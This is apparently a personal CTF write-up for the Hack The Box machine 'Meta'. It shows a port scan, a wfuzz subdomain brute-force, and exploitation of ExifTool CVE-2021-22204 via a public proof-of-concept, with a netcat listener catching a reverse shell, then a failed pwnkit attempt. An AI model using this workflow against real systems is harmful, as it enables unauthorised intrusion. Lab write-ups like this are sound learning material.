---
layout: post
title: CTF Meta
date:   2022-02-01 20:15:02 -0600
categories: CTF
tags: Linux
---

# hosts

/etc/hosts
10.10.11.140 artcorp.htb

# rustscan

```sh
rustscan -a meta.htb  --range 1-65000

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
# wfuzz


Nothing with the dir listing
But with the sub listing I have this:
https://infinitelogins.com/2020/09/02/bruteforcing-subdomains-wfuzz/
```sh
wfuzz -c -f sub-fighter -w Documents/wordlist/subdomains.lst -u 'http://artcorp.htb' -H "Host: FUZZ.artcorp.htb" --hw 9000 |grep 200
```
![](https://i.imgur.com/bDR4PlH.png)
dev01.artcorp.htb.
I add it to my /etc/hosts.

![](https://i.imgur.com/PCCkNS7.png)
![](https://i.imgur.com/7JLdMUl.png)

It's an exif tool, to see the metadatas.
# Exploit exiff


https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/
I found this website who can give cool infos.
CVE-2021-22204
https://github.com/convisolabs/CVE-2021-22204-exiftool
## Install exiftool
https://exiftool.org/install.html

## Install djvulibre
sudo pacman -S djvulibre

## Download
git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git 
## Edit the file 

ip = '10.10.15.22'
port = '4444'


## Open the listener
```sh
nc -nlvp 4444
```
# BOOMMMM

I upload the file and the shell pop.
![](https://i.imgur.com/QAVnkMH.png)

# Exploit pwnkit
It's not working.
![](https://i.imgur.com/98Q0Qjk.png)

I think I have to get the user first.
 should also do a directory with all my tools and open the python http server when I need them.

I need th go to sleep...




